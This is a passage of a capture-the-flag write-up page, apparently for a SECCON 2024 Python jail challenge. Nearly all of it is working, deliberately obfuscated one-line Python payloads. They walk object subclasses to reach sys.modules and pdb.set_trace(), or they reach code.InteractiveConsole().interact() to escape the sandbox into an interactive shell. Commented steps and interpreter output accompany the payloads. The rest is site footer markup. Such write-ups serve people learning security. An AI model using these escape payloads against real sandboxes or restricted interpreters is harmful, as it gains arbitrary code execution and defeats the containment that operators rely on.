+[&lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;, &lt;module 'builtins' (built-in)&gt;]
+# run builtins.help()
+&gt;&gt; [m.help()for B in[().__class__.__base__]for L in[[].__class__.__name__]for x in B.__subclasses__()if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True]for G in[x.__init__.__globals__]if L[True+True]+B.__class__.__name__[True]+L[True+True]in G for S in[G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]for m in S.modules.values()if m.__name__==[].__class__.__module__][False]
+# load pdb and return to sandbox
+pdb
+sandbox
+# step 2. execute pdb.set_trace()
+&gt;&gt; [B.__class__.__name__ for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]][False]
+type
+&gt;&gt; [G.__class__.__name__ for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]][False]
+dict
+&gt;&gt; [B.__name__ for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]][False]
+object
+# "type"[2]+"dict"[0]+"object"[1] == "pdb"
+&gt;&gt; [S.modules[B.__class__.__name__[True+True]+G.__class__.__name__[False]+B.__name__[True]] for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]][False]
+&lt;module 'pdb' from '/usr/local/lib/python3.12/pdb.py'&gt;
+&gt;&gt; [S.modules[B.__class__.__name__[True+True]+G.__class__.__name__[False]+B.__name__[True]].set_trace() for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]][False]
+# enters pdb prompt</code></pre>
+<p>@(ztz:</p>
+<pre class="highlight"><code class="language-python"># step 1. run help()
+# z=2, t=9*2+1=19, zt=19*8+2*3+1=159
+# 159 is the index of _sitebuiltins._Helper
+&gt;&gt; [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__]
+["Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.", True, 2, 19, 159, &lt;built-in method __subclasses__ of type object at 0x7efe341e6040&gt;]
+# locate _sitebuiltins._Helper
+&gt;&gt; [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]]
+["Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.", True, 2, 19, 159, &lt;built-in method __subclasses__ of type object at 0x7efe341e6040&gt;, &lt;class '_sitebuiltins._Helper'&gt;]
+# locate code.InterativeConsole class
+# enter help prompt, enter code to load code module, quit to return
+# the newly loaded code.InteractiveInterpreter is a subclass of object
+&gt;&gt; [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]()(),a()]
+[..., [..., &lt;class 'code.InteractiveInterpreter'&gt;, &lt;class 'pydoc.TextDoc.docclass.&lt;locals&gt;.HorizontalRule'&gt;, &lt;class 'pydoc.TextDoc.docclass.&lt;locals&gt;.HorizontalRule'&gt;]]
+# ww-ww-ww-ww-ww is -4, code.InteractiveConsole is a subclass of code.InteractiveInterpreter
+&gt;&gt; [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]()(),a()[ww-ww-ww-ww-ww].__subclasses__()[False]]
+["Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.", True, 2, 19, 159, &lt;built-in method __subclasses__ of type object at 0x7efe341e6040&gt;, None, &lt;class 'code.InteractiveConsole'&gt;]
+# get interactive shell by code.InteractiveConsole().interact()
+&gt;&gt; [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]()(),a()[ww-ww-ww-ww-ww].__subclasses__()[False]().interact()]
+
+https://github.com/mmm-team/public-writeups/blob/d592f318b5daa813b89d4b1bae323862fda911de/seccon2024/jail_1linepyjail/README.md?plain=1#L15</code></pre></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
